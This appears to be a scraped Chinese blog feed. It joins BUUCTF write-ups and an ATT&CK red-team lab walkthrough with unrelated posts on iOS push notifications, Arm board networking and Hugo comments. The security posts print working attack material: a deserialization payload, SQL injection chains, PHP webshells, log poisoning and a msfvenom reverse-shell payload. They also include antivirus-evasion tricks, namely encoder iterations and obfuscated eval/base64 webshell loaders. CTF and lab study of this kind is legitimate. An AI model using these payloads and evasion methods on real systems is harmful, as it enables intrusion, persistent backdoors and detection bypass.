代码审计，题目的考察点在于MD5绕过和反序列化，我们所需提交的内容如下：\nGET提交:\tpleaseget=1\rPOST提交第一部分:\tpleasepost=2\u0026amp;md51=0\u0026amp;md52=\u0026quot;a\u0026quot;\rPOST提交第二部分:\tobj，一个BUU类的实例化对象，属性值在经过$this-\u0026gt;correct=base64_encode(uniqid());之后依然全等，可以通过把变化的$correct属性引用赋值给$input\r// 解析\r__destruct():\t对象所有引用都被删除或当对象被显示销毁时执行\runiqid():\t基于以微秒的当前时间生成一个唯一ID\r传值赋值:\t变量默认为传值赋值，即当一个表达式的值赋予一个变量时，整个原始表达式的值被赋到目标变量。如把变量a的值赋给变量b，改变a的值不会影响b的值，反之亦然\r引用赋值:\t新变量会简单引用(也可理解为指向)原始变量，改动新变量值的同时也会改变原始变量的值，反之亦然\r接下来我们就编写代码构造payload：\n\u0026lt;?php class BUU{ public $correct = \u0026#34;\u0026#34;; public $input = \u0026#34;\u0026#34;; public function __destruct() { try { $this-\u0026gt;correct = base64_encode(uniqid()); if ($this-\u0026gt;correct === $this-\u0026gt;input) { echo file_get_contents(\u0026#34;/flag\u0026#34;); } } catch (Exception $e){ } } } $res = new BUU(); $res-\u0026gt;input = \u0026amp;$res-\u0026gt;correct;\t// 传入一个引用 echo serialize($res); ?\u0026gt;执行结果:\nO:3:\u0026quot;BUU\u0026quot;:2:{s:7:\u0026quot;correct\u0026quot;;s:0:\u0026quot;\u0026quot;;s:5:\u0026quot;input\u0026quot;;R:2;}\r传递参数如下：\nGET:\rpleaseget=1\rPOST:\rpleasepost=2\r\u0026amp;md51[]=1\r\u0026amp;md52[]=2\r\u0026amp;obj=O:3:\u0026quot;BUU\u0026quot;:2:{s:7:\u0026quot;correct\u0026quot;;s:0:\u0026quot;\u0026quot;;s:5:\u0026quot;input\u0026quot;;R:2;}\rBUU BRUTE 1 是一个登录框，尝试admin/admin，页面回显密码错误，为四位数字。，直接上bp爆破。\n步骤一\n抓取点击提交按钮时的数据包并发送至Intruder模块。\n步骤二\n在Inturder模块中将password设置为payload，然后选择数字字典。\n步骤三\n可将爆破间隔时间调高避免被封。\n也可用以下python脚本：\nimport requests import time url = \u0026#39;http://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/?username=admin\u0026amp;password=\u0026#39; for i in range(6000, 6499): res = requests.get(url+str(i)) time.sleep(0.1) if res.text != \u0026#39;密码错误，为四位数字。\u0026#39;: print(res.text) break sqli-labs SQL注入，传入参数id=1和id=-1，页面回显正常，传入id=1'，页面报错，判断为字符型注入。使用联合查询看看有几列数据：\n?id=-1\u0026#39;union select 1,2,3--+ 经过尝试后发现总共有三列数据，查看当前库名：\n?id=-1\u0026#39;union select 1,database(),3--+ 爆库名：\n?id=-1\u0026#39;union select 1,database(),group_concat(schema_name) from information_schema.schemata--+ // 结果如下 Your Login name:security Your Password:ctftraining,information_schema,mysql,performance_schema,security,test 爆表名：\n?id=-1\u0026#39;union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;ctftraining\u0026#39;--+ // 结果如下 Your Login name:security Your Password:flag,news,users 爆列名：\n?id=-1\u0026#39;union select 1,database(),group_concat(column_name) from information_schema.columns where table_schema=\u0026#39;ctftraining\u0026#39; and table_name=\u0026#39;flag\u0026#39;--+ // 结果如下 Your Login name:security Your Password:flag 爆字段：\nid=-1\u0026#39;union select 1,database(),group_concat(flag) from ctftraining.flag--+ BUU SQL COURSE 1 一个简单的新闻网，尝试在登录框进行SQL注入，发现都被过滤了。本来打算在测试新闻页面进行注入的，可是没找到注入点，发现登录框注入行不通后，打开网络控制台，切换到Network模块，看看页面都加载了什么资源，发现有一个content_detail.php页面：\n\u0026lt;domain\u0026gt;:\u0026lt;port\u0026gt;/backend/content_detail.php?id=1\r进行注入类型判断：\n?id=1 and 1=1--+\t// 页面回显正常 ?id=1 and 1=2--+\t// 页面回显错误 判断为数字型注入。\n使用联合查询查看有几列数据：\n?id=-1 union select 1,2--+ 一共有两列数据，均为回显点。\n爆库：\n?id=-1 union select 1,group_concat(schema_name) from information_schema.schemata // 结果 {\u0026#34;title\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;content\u0026#34;:\u0026#34;information_schema,ctftraining,mysql,performance_schema,test,news\u0026#34;} 爆表：\n?id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;ctftraining\u0026#39;--+  // 结果 {\u0026#34;title\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;content\u0026#34;:\u0026#34;FLAG_TABLE,news,users\u0026#34;} 爆列：\n?id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39;--+  // 结果 {\u0026#34;title\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;content\u0026#34;:\u0026#34;id,username,password,ip,time,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS\u0026#34;} 爆字段：\n// username字段 ?id=-1 union select 1,group_concat(username) from ctftraining.users--+ {\u0026#34;title\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;content\u0026#34;:\u0026#34;admin,guest,virink\u0026#34;} // password字段 ?id=-1 union select 1,group_concat(password) from ctftraining.users--+ {\u0026#34;title\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;content\u0026#34;:\u0026#34;21232f297a57a5a743894a0e4a801fc3,084e0343a0486ff05530df6c705c8bb4,a4346e75cc1dd161a8d57f3b2d5d82d0\u0026#34;} 然后发现密码不对，再尝试爆破news表，步骤如上。\nBUU UPLOAD COURSE 1 页面如下：\n查看页面元素：\n\u0026lt;form action=\u0026#34;index.php?file=upload.php\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;upload_file\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;上传\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; 发现此处通过file参数调用文件，检查一下是否存在文件包含漏洞，上传一个phpinfo看看：\n\u0026lt;?php phpinfo();?\u0026gt;上传成功后会随机返回一个地址，而且文件后缀被更改为.jpg，我们查看命令是否能被解析：\n?file=uploads/\u0026lt;random-value\u0026gt;.jpg\r成功回显phpinfo页面，按照划水经验来讲，flag应该在根目录，在bp中将文件内容更改如下：\n\u0026lt;?php system(\u0026#34;cat /flag\u0026#34;);?\u0026gt;发包，访问，成功获得flag。\nBUU BURP COURSE 1 访问页面，显示只能本地访问，分别尝试构造了X-Forwarded-For、X-Originating-IP、X-Remote-IP、X-Remote-Addr四个字段，均未成功\u0026hellip;\n查了资料发现还有个X-Real-IP，在bp中添加请求头，访问成功，是一个登录页面，将URL复制，粘贴到浏览器访问：\n点击登录后还是显示只能本地访问，抓取点击登录的包，放在bp里面添加请求头，查看响应包即可。\n X-Forwarded-For：记录代理信息，每经过一次代理（匿名代理除外），代理服务器都会把这次请求的来源IP追加在X-Forwarded-For中并且用逗号分隔。\nX-Real-IP：一般只记录真实发出请求的客户端IP。\n BUU XSS COURSE 1 一个树洞系统，分为留言和登录两个模块，猜测需要通过XSS获取管理员Cookie进行登录。\n先检验一下过滤情况，在留言处输入如下语句：\n\u0026lt;scrIpT\u0026gt;alert(/xss/)\u0026lt;/scrIpT\u0026gt; 提交后会回显一个随机地址，访问发现什么也没有，打开控制台查看页面元素：\n\u0026lt;span data-v-1a9a378f=\u0026#34;\u0026#34;\u0026gt; \u0026lt;script\u0026gt;alert(/xss/)\u0026lt;/script\u0026gt; \u0026lt;/span\u0026gt; 语句被放到了span标签中，接下来看看能否使用img标签：\n\u0026lt;img src=# onerror=alert(xss)/\u0026gt; 页面无法加载图片，标签能够正常使用，页面元素：\n\u0026lt;span data-v-1a9a378f=\u0026#34;\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;#\u0026#34; onerror=\u0026#34;alert(xss)/\u0026#34;\u0026gt; \u0026lt;/span\u0026gt; 接下来我们就需要构造一个存储型XSS，获取管理员Cookie，登录得到flag。那么现在还缺少一个相应的接收平台，这里使用XSS Platform (buuoj.cn)进行构造。\n注册登录后选择创建项目。\n平台暂时使用不了……\nPikaChu  本文链接：BUUCTF | Atmet\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","permalink":"https://oopsdc.com/post/buuctf/","summary":"Basic Linux Labs  2020年10月24日 更新：目前所有靶机均能直接访问互联网。\n点击启动靶机可以启动一台安装好了 LAMP 的机器。\n并且这台机器位于靶机内网，所有动态靶机均可直接通过主机名访问这台机器。\n但由于目前一个账户只能同时启动一台靶机，您如果有需要建议浏览器开一个隐私窗口，注册一个新账号来启动这个靶机。\nssh 用户名：root 密码：123456 地址和端口为动态分配的。\n 开启环境后按照题目给定地址和端口使用SSH连接即可。\n连接上云主机后使用ls命令，发现当前用户家目录下啥也没有，再使用cd ..命令切换到根目录下看看，发现flag.txt文件。\n也可直接使用cat /flag.txt命令查看flag。\nBUU LFI COURSE 1 启动环境后得到如下PHP代码：\n\u0026lt;?php /** * Created by PhpStorm. * User: jinzhao * Date: 2019/7/9 * Time: 7:07 AM */ highlight_file(__FILE__); if(isset($_GET[\u0026#39;file\u0026#39;])) { $str = $_GET[\u0026#39;file\u0026#39;]; include $_GET[\u0026#39;file\u0026#39;]; } 本地文件包含，通过file参数进行传参，可在URL后构造参数?file=/flag查看flag。\n拓展 通过Wappalyzer插件可以发现网站使用了nginx服务，尝试访问nginx访问日志：\n?file=/var/log/nginx/access.log\r页面回显出我们刚才的访问记录，接下来我们使用bp抓包尝试写入phpinfo。\n通过在User-Agent字段最后插入aaaaaaa\u0026lt;?php phpinfo();?\u0026gt;bbbbbbb传入phpinfo()，刷新页面后检查是否传入成功。\nRequest请求包如下：\nGET /?file=/var/log/nginx/access.log HTTP/1.1\rHost: \u0026lt;domain\u0026gt;:\u0026lt;port\u0026gt;\rCache-Control: max-age=0\rUpgrade-Insecure-Requests: 1\rUser-Agent: Mozilla/5.","title":"BUUCTF"},{"content":"一、环境搭建 1.1 下载虚拟机文件 自行搜索。\n1.2 环境介绍 开机密码：hongrisec@2019.\n本次实验共3台主机，Win7作为Web服务器，是最先攻击点，Win2k3为内网域成员主机，Win2k8 R2为内网域控主机。\nKali：自主搭建，配置与Web服务器同一网段的IP，使用命令ifconfig eth0 \u0026lt;ip\u0026gt;即可。\nWin7：双网卡，即存在内外网IP。外网网卡通过DHCP自动获取IP，内网网卡配置静态IP:192.168.52.143。服务器存在yxcms。分别与Kali(NAT模式)和内网两台主机(自定义VMnet2)连通。\nWin2k3：只有内网网卡，IP:192.168.52.138，使用VMnet2。\nWin2k8 R2：只有内网网卡，IP:192.168.52.141，使用VMnet2。\n拓扑图如下：\n![Untitled Diagram](https://gitee.com/oopsdc/PicBed/raw/master/img/Untitled Diagram.png)\n安装完成之后在Win7主机上打开phpstudy开启Web服务。\n二、信息收集 2.1 探测存活主机 命令：\nnmap -sS -sV -O 192.168.106.0/24\r# 此处的IP为NAT模式下Win7和Kali自动获取到的IP\r# 参数说明\rsS\t:\tSYN半连接扫描，只进行前两次握手\rsV\t:\t显示服务器详细版本\rO\t:\t显示服务器操作系统(不太准确)\r结果：\nNmap scan report for 192.168.106.150\rHost is up (0.00044s latency).\rNot shown: 998 filtered ports\rPORT STATE SERVICE VERSION\r80/tcp open http Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.4.45)\r3306/tcp open mysql MySQL (unauthorized)\rMAC Address: 00:0C:29:33:16:84 (VMware)\rWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\rDevice type: general purpose\rRunning: Microsoft Windows 2008|7|8.1|Vista\rOS CPE: cpe:/o:microsoft:windows_server_2008::beta3 cpe:/o:microsoft:windows_server_2008 cpe:/o:microsoft:windows_7::-:professional cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1:r1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1\rOS details: Microsoft Windows Server 2008 or 2008 Beta 3, Microsoft Windows 7 Professional or Windows 8, Microsoft Windows 8.1 R1, Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7, Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008\rNetwork Distance: 1 hop\r2.2 访问Web服务 尝试访问主机80端口，发现为php探针页面。获得操作系统、编译引擎、主机名、绝对路径、管理员邮箱等信息。可考虑通过钓鱼攻击等方式进一步获取信息。\n继续向下翻，有数据库检测和函数检测功能:\n尝试数据库弱口令，账密为root/root。\n2.3 目录探测 使用dirbuster或御剑等工具扫描目录，发现/phpmyadmin/登录目录和beifen.rar网站源代码。\n访问192.168.106.150/phpmyadmin使用默认账密root/root登录phpmyadmin后台管理页面。\n查看下载下来的网站源代码，发现网站使用了yxcms，访问192.168.106.150/yxcms，发现是一个默认的演示站点，继续访问192.168.106.150/yxcms/robots.txt，内容如下：\n#\r# robots.txt for YXCMS\r#\rUser-agent: * Disallow: /data\rDisallow: /protected\r访问192.168.106.150/yxcms/data，发现一个目录索引：\n访问192.168.106.150/yxcms/protected：\n三、漏洞利用 3.1 漏洞探寻与利用 3.1.1 yxcms信息泄露+弱口令 查看主页面的公共信息栏，有默认账密：\nURL与默认账密均未修改，直接登录管理员后台。\n3.1.2 phpmyadmin弱口令 在目录探测部分中已介绍。\n3.1.3 yxcms留言板xss漏洞 进入留言板模块，构造如下内容：\n登录后台管理页面→结构管理→留言本→审核刚刚提交的评论，刷新留言板页面，成功触发XSS，管理访问审核页面以及其他用户访问留言板时都会触发弹窗，为存储型XSS漏洞。\n3.1.4 yxcms后台任意文件读写漏洞 进入后台管理页面→管理首页→前台模板→管理模板文件→新建，写入一句话木马：\n创建之后，根据之前的目录索引或网站源码查找文件存储路径：http://192.168.106.150/yxcms/protected/apps/default/view/default/，使用蚁剑连接小马：\nShell url\t:\thttp://192.168.106.150/yxcms/protected/apps/default/view/default/oopsdc.php\rShell pwd\t:\tcmd\r成功连接。\n3.1.5 yxcms后台SQL注入漏洞 进入后台管理页面→结构管理→碎片列表→删除，在点击删除之前使用bp抓包，正常删除已存在的碎片会有回显结果，删除不存在的碎片则无回显，判断存在SQL盲注。对于无回显的情况，可通过使用CEYECEYE平台的使用 - 时光不改 - 博客园 (cnblogs.com)及类似工具查看回显。\n3.1.6 SQL语句文件写入 在phpmyadmin页面通过SQL查询语句outfile写入一句话木马：\nselect \u0026#39;\u0026lt;?php eval($_POST[123]);?\u0026gt;\u0026#39; into outfile \u0026#39;C:/phpStudy/WWW/1.php\u0026#39; 查看secure-file-priv变量配置：\nshow global variable like \u0026#39;%secure%\u0026#39;; 变量值为NULL不可读写，且变量只读不可编辑。\n3.1.7 开启全局日志getshell 使用以下语句查询全局日志变量配置：\nshow variables like \u0026#39;%general%\u0026#39;; 开启general_log将所有查询语句记录到新指定的可访问文件中：\nset global general_log = on; set global general_log_file = \u0026#39;C:/phpStudy/www/2.php\u0026#39;; 写入一句话木马：\nselect \u0026#39;\u0026lt;?php eval($_POST[123]);?\u0026gt;\u0026#39; 蚁剑连接即可。\n3.2 后台getshell技巧 3.2.1 上传大马 上传大马获得命令执行环境。\n3.2.2 msf监听反弹shell 进入msf：\nmsfconsole\r使用msfvenom生成payload文件，使用蚁剑上传至WWW目录：\nmsfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.106.138 -f raw \u0026gt; test.php # 参数解释 p\t:\t添加载荷(payload) f\t:\t输出文件格式，文件会在当前目录生成 接下来使用handler模块接收反弹模块，在8888端口进行监听，访问test.php，连接成功：\nuse exploit/multi/handler\rrun\r还可利用应用系统漏洞，如永恒之蓝等。\n3.2.3 免杀payload 在目标主机存在杀软的情况下，上传payload后会被检测并清除，因此需要对payload进行免杀操作。使用msfvenom生成payload，此处采用shellcode方式借助第三方直接加载到内存中，如：\nmsfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 12 -b \u0026#39;\\x00\u0026#39; LHOST=\u0026lt;ip\u0026gt; LPORT=\u0026lt;port\u0026gt; -f c # 参数解释 e\t:\t选择指定编码器 i\t:\t编码次数 b\t:\t去除多余/坏掉字符 f\t:\t输出文件格式，此处使用C编译器编写代码 相关文章：\nPayload 实现分离免杀 - lyshark - 博客园 (cnblogs.com)\n还可通过多层编码对大马原文件进行编码，对关键字进行拆解免杀，脚本：\n$src = file_get_contents(\u0026#39;C:\\phpStudy\\WWW\\dama.txt\u0026#39;);\t# 大马源码路径 $enc = base64_encode(gzdeflate($code));\t# 加密函数，可自行修改 echo $enc\t# 输出编码后的代码 使用编码后的代码：\n\u0026lt;?php eval(gzdeflate(base64_decode(\u0026#39;\u0026lt;encoded-string\u0026gt;\u0026#39;))); ?\u0026gt;关键字免杀：\n\u0026lt;?php $o = \u0026#39;BasE6\u0026#39;; $p = \u0026#39;4_\u0026#39;; $s = \u0026#39;dE\u0026#39;; $d = \u0026#39;Co\u0026#39;; $c = \u0026#39;De\u0026#39;; $opsdc = $o.$p.$s$.d.$c; $a = \u0026#34;opsdc\u0026#34;; $res = $$a(\u0026#39;源码Base64编码\u0026#39;) eval($res); ?\u0026gt;\u0026lt;? $res = strrev(\u0026#39;EdoCeD_46EsAb\u0026#39;); $b = $res(\u0026#39;源码Base64编码\u0026#39;); eval($b); ?\u0026gt;  本文链接：ATT\u0026amp;CK实战一 | Atmet (oopsdc.tk)\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","permalink":"https://oopsdc.com/post/attck%E5%AE%9E%E6%88%98%E4%B8%80/","summary":"一、环境搭建 1.1 下载虚拟机文件 自行搜索。\n1.2 环境介绍 开机密码：hongrisec@2019.\n本次实验共3台主机，Win7作为Web服务器，是最先攻击点，Win2k3为内网域成员主机，Win2k8 R2为内网域控主机。\nKali：自主搭建，配置与Web服务器同一网段的IP，使用命令ifconfig eth0 \u0026lt;ip\u0026gt;即可。\nWin7：双网卡，即存在内外网IP。外网网卡通过DHCP自动获取IP，内网网卡配置静态IP:192.168.52.143。服务器存在yxcms。分别与Kali(NAT模式)和内网两台主机(自定义VMnet2)连通。\nWin2k3：只有内网网卡，IP:192.168.52.138，使用VMnet2。\nWin2k8 R2：只有内网网卡，IP:192.168.52.141，使用VMnet2。\n拓扑图如下：\n![Untitled Diagram](https://gitee.com/oopsdc/PicBed/raw/master/img/Untitled Diagram.png)\n安装完成之后在Win7主机上打开phpstudy开启Web服务。\n二、信息收集 2.1 探测存活主机 命令：\nnmap -sS -sV -O 192.168.106.0/24\r# 此处的IP为NAT模式下Win7和Kali自动获取到的IP\r# 参数说明\rsS\t:\tSYN半连接扫描，只进行前两次握手\rsV\t:\t显示服务器详细版本\rO\t:\t显示服务器操作系统(不太准确)\r结果：\nNmap scan report for 192.168.106.150\rHost is up (0.00044s latency).\rNot shown: 998 filtered ports\rPORT STATE SERVICE VERSION\r80/tcp open http Apache httpd 2.4.23 ((Win32) OpenSSL/1.","title":"ATT\u0026CK实战一"},{"content":"APNs简述 Apple Push Notification server(APNs)，即苹果推送通知服务。\nAPNs出现需求 由于移动设备内存、CPU、电池容量等各种因素，iOS不允许APP进程常驻后台(时限大概为10min)。\n当用户主动关闭APP或后台APP进入后台达到限定时长后，意味着该APP进程的结束，在一定程度上保证了手机的流畅度与使用时长。但这也同时意味着服务器无法主动和用户交互(如实时推送消息)，为了解决这个限制，苹果推出了APNs，允许设备和服务器分别与苹果的推送服务器保持长连接状态。\niOS通知 iOS通知分为本地通知和远程通知两类，APNs是远程通知功能的核心。\n本地通知 由本地应用触发，一般是基于时间的通知形式，如闹钟、日历、待办事项等。\n远程通知 通过自建服务器推送消息的通知形式。\nAPNs推送流程 苹果官方APNs概述:Local and Remote Notification Programming Guide: APNs Overview (apple.com)\n以下为APNs推送流程图:\n Provider:自建应用服务器 APNs:苹果APNs推送通知服务器 Device:苹果设备 Client App:应用  大致流程可分为以下4点:\n 苹果设备安装应用后会向APNs服务器进行注册，注册成功后APNs服务器返回一个deviceToken，且二者之间会维持一个基于SSL协议的TCP流通讯的长连接。 拿到deviceToken后设备会将其发送至自建应用服务器 有消息需要被推送时，自建服务器会将消息按指定格式结合deviceToken一并打包发送给APNs。 APNs将新消息推送至设备，并在设备屏幕上显示出来(因为设备和服务器之间维持了一个长连接)  结合上述过程可以发现，真正完成推送的是APNs服务器，消息一定是由APNs服务器推送给我们的设备，自建应用服务器只是将需要推送的消息告诉APNs服务器。至于如何维护消息队列或如何保证消息能被推送到指定设备上，这些功能都是由APNs实现的。\ndeviceToken deviceToken是一个APP安装在设备上的唯一标识符，一个APP在不同设备上的deviceToken不同，同一台设备重新安装同一个APP后deviceToken也会不同。\n项目代码AppDelegate中有一个回调方法，当APNs注册成功后通过该回调方法可以获取到返回的deviceToken。\n- (void)application:(UIApplication *)application didRegisterForRemoteNotificationsWithDeviceToken:(NSData *)deviceToken APNs拿到这个包之后会验证包结构是否正确，验证无误后会提取其中的消息，再将消息推送至指定设备。\n消息体结构如下:\n{ \u0026#34;aps\u0026#34;:{ \u0026#34;alert\u0026#34;:{\t// 显示在用户设备上的推送标题内容 \u0026#34;title\u0026#34;:\u0026#34;Test Request\u0026#34;, \u0026#34;body\u0026#34;:\u0026#34;This is a test msg.\u0026#34;, }, \u0026#34;badge\u0026#34;:5,\t// 显示的数量(整形类型)，是在应用icon右上角显示的数量，提示有几条未读信息 \u0026#34;sound\u0026#34;:\u0026#34;default\u0026#34;\t// 推送消息声 } } 其实这就是一个JSON结构体，上述代码只是一种简单消息体，详情可见苹果官方文档:Local and Remote Notification Programming Guide: Creating the Remote Notification Payload (apple.com)\n安全架构 APNs用连接信任(connection trust)和token信任(token trust)来控制通信入口。\n连接信任 连接信任主要有两个作用:\n 保证APNs连接的服务器是苹果已同意允许进行通信的服务器。 保证APNs连接设备的合法性，由APNs处理。  我们所需要完成的工作就是处理服务器和APNs之间的连接安全性。\n服务器与APNs之间的连接信任 每个服务器必须有一个唯一的provider证书和私钥，均用于验证连接，其中provider证书需在苹果开发者官网申请。\n服务器通过TLS验证和APNs进行连接，过程为四步握手:\n 初始化TLS连接，即服务器给APNs发送请求。 APNs服务器向服务器返回APNs证书，即公钥。 服务器端收到后生成provider证书并返回给APNs。 APNs收到验证后即可建立TLS连接，但并不是使用HTTPS，而是HTTP/2。  常见问题 从设备卸载应用后如何处理推送消息 当我们卸载应用后便不会再收到推送消息，也就是说APNs和Provider得知用户已卸载了应用，那么这个过程是怎么实现的呢？\n这是通过利用苹果提供的反馈服务(Feedback Service)，它是APNs的一部分，APNs会持续更新Feedback Service列表，当Provider将信息发给APNs，APNs再将消息推送到设备时，若设备无法将消息推送给指定应用，则会向APNs返回一个反馈信息，而这个反馈信息就记录在Feedback Service中。对于这种机制，Provider应该定时检测Feedback Service列表，然后删除在自己数据库中记录的deivce Token，从而判断应用已卸载的情况。\n在连接Feedback Service的过程中，同样使用长连接方式，连接成功之后会直接接收由APNs传输给我们的反馈列表，传输完成后就会断开连接，然后根据最新的反馈列表更新应用服务器数据库。\n 本文链接：APNs推送机制 | Atmet (oopsdc.tk)\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","permalink":"https://oopsdc.com/post/%E6%B5%85%E6%9E%90apns%E6%8E%A8%E9%80%81%E6%9C%BA%E5%88%B6/","summary":"APNs简述 Apple Push Notification server(APNs)，即苹果推送通知服务。\nAPNs出现需求 由于移动设备内存、CPU、电池容量等各种因素，iOS不允许APP进程常驻后台(时限大概为10min)。\n当用户主动关闭APP或后台APP进入后台达到限定时长后，意味着该APP进程的结束，在一定程度上保证了手机的流畅度与使用时长。但这也同时意味着服务器无法主动和用户交互(如实时推送消息)，为了解决这个限制，苹果推出了APNs，允许设备和服务器分别与苹果的推送服务器保持长连接状态。\niOS通知 iOS通知分为本地通知和远程通知两类，APNs是远程通知功能的核心。\n本地通知 由本地应用触发，一般是基于时间的通知形式，如闹钟、日历、待办事项等。\n远程通知 通过自建服务器推送消息的通知形式。\nAPNs推送流程 苹果官方APNs概述:Local and Remote Notification Programming Guide: APNs Overview (apple.com)\n以下为APNs推送流程图:\n Provider:自建应用服务器 APNs:苹果APNs推送通知服务器 Device:苹果设备 Client App:应用  大致流程可分为以下4点:\n 苹果设备安装应用后会向APNs服务器进行注册，注册成功后APNs服务器返回一个deviceToken，且二者之间会维持一个基于SSL协议的TCP流通讯的长连接。 拿到deviceToken后设备会将其发送至自建应用服务器 有消息需要被推送时，自建服务器会将消息按指定格式结合deviceToken一并打包发送给APNs。 APNs将新消息推送至设备，并在设备屏幕上显示出来(因为设备和服务器之间维持了一个长连接)  结合上述过程可以发现，真正完成推送的是APNs服务器，消息一定是由APNs服务器推送给我们的设备，自建应用服务器只是将需要推送的消息告诉APNs服务器。至于如何维护消息队列或如何保证消息能被推送到指定设备上，这些功能都是由APNs实现的。\ndeviceToken deviceToken是一个APP安装在设备上的唯一标识符，一个APP在不同设备上的deviceToken不同，同一台设备重新安装同一个APP后deviceToken也会不同。\n项目代码AppDelegate中有一个回调方法，当APNs注册成功后通过该回调方法可以获取到返回的deviceToken。\n- (void)application:(UIApplication *)application didRegisterForRemoteNotificationsWithDeviceToken:(NSData *)deviceToken APNs拿到这个包之后会验证包结构是否正确，验证无误后会提取其中的消息，再将消息推送至指定设备。\n消息体结构如下:\n{ \u0026#34;aps\u0026#34;:{ \u0026#34;alert\u0026#34;:{\t// 显示在用户设备上的推送标题内容 \u0026#34;title\u0026#34;:\u0026#34;Test Request\u0026#34;, \u0026#34;body\u0026#34;:\u0026#34;This is a test msg.\u0026#34;, }, \u0026#34;badge\u0026#34;:5,\t// 显示的数量(整形类型)，是在应用icon右上角显示的数量，提示有几条未读信息 \u0026#34;sound\u0026#34;:\u0026#34;default\u0026#34;\t// 推送消息声 } } 其实这就是一个JSON结构体，上述代码只是一种简单消息体，详情可见苹果官方文档:Local and Remote Notification Programming Guide: Creating the Remote Notification Payload (apple.","title":"浅析APNs推送机制"},{"content":"文章背景 使用S5P6818开发板时，有业务上云的需求，遂有本文，内容较少，仅涉及联网部分。\n问题描述  插上网线后无法获取IP 配置静态IP后无法ping通外网  解决方案 分两步解决。\n1.配置静态IP 方法一\n命令行配置:\nifconfig eth0 \u0026lt;ip\u0026gt; netmask \u0026lt;netmask\u0026gt; 方法二\n写配置文件:\nvi /etc/init.d/rcS # 网卡开机自启 ifconfig eth0 up ifconfig eth0 \u0026lt;ip\u0026gt; netmask \u0026lt;netmask\u0026gt; 2.配置网关及DNS服务器 完成第一步后，可以ping通局域网下的主机，但无法ping通外网，出现如下报错:\nsendto: Network is unreachable\r使用route命令查看路由表:\nKernel IP routing table\rDestination Gateway Genmask Flags Metric Ref Use Iface\r\u0026lt;ip\u0026gt; * 255.255.255.0 U 0 0 0 eth0\r发现没有网关，配置网关:\nroute add default gw \u0026lt;ip\u0026gt; 再使用route命令验证一下，确认配好。\n之后便要配置DNS解析，在/etc目录下新建一个resolv.conf配置文件，内容如下:\n#114 DNS服务器\rnameserver 114.114.114.114 #微软 DNS服务器\rnameserver 233.5.5.5\r#google DNS服务器\rnameserver 8.8.8.8\r以上配置文件也可把其它DNS服务器地址注释掉，只使用指定DNS服务器，成功ping通外网。\n 本文链接：Arm开发板联网配置 | Atmet (oopsdc.tk)\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","permalink":"https://oopsdc.com/post/arm%E5%BC%80%E5%8F%91%E6%9D%BF%E8%81%94%E7%BD%91%E9%85%8D%E7%BD%AE/","summary":"文章背景 使用S5P6818开发板时，有业务上云的需求，遂有本文，内容较少，仅涉及联网部分。\n问题描述  插上网线后无法获取IP 配置静态IP后无法ping通外网  解决方案 分两步解决。\n1.配置静态IP 方法一\n命令行配置:\nifconfig eth0 \u0026lt;ip\u0026gt; netmask \u0026lt;netmask\u0026gt; 方法二\n写配置文件:\nvi /etc/init.d/rcS # 网卡开机自启 ifconfig eth0 up ifconfig eth0 \u0026lt;ip\u0026gt; netmask \u0026lt;netmask\u0026gt; 2.配置网关及DNS服务器 完成第一步后，可以ping通局域网下的主机，但无法ping通外网，出现如下报错:\nsendto: Network is unreachable\r使用route命令查看路由表:\nKernel IP routing table\rDestination Gateway Genmask Flags Metric Ref Use Iface\r\u0026lt;ip\u0026gt; * 255.255.255.0 U 0 0 0 eth0\r发现没有网关，配置网关:\nroute add default gw \u0026lt;ip\u0026gt; 再使用route命令验证一下，确认配好。\n之后便要配置DNS解析，在/etc目录下新建一个resolv.conf配置文件，内容如下:\n#114 DNS服务器\rnameserver 114.114.114.114 #微软 DNS服务器\rnameserver 233.","title":"Arm开发板联网配置"},{"content":"概述 utterances是一个基于GitHub issue，拥有多种主题的开源小组件，本文将简述使用如何在hugo博客部署utterances。\n配置过程 新建仓库 新建一个公开的仓库，用于存放评论，名字随意。作者在此处创建一个名为utterances的公开仓库。\n安装utterances GitHub Apps - utterances\n点击安装即可，选择仓库：\n安装完成后会自动跳转到官方页面。\n在文件中添加插件 官方文档:utterances\n修改footer.html文件，以PaperMod主题为例：\n\u0026lt;footer class=\u0026#34;footer\u0026#34;\u0026gt; {{- if .Site.Copyright }} \u0026lt;span\u0026gt;{{ .Site.Copyright | markdownify }}\u0026lt;/span\u0026gt; {{- else }} \u0026lt;span\u0026gt;\u0026amp;copy; {{ now.Year }} \u0026lt;a href=\u0026#34;{{ \u0026#34;\u0026#34; | absLangURL }}\u0026#34;\u0026gt;{{ .Site.Title }}\u0026lt;/a\u0026gt;\u0026lt;/span\u0026gt; {{- end }} \u0026lt;span\u0026gt;\u0026amp;middot;\u0026lt;/span\u0026gt; \u0026lt;span\u0026gt;Powered by \u0026lt;a href=\u0026#34;https://gohugo.io/\u0026#34; 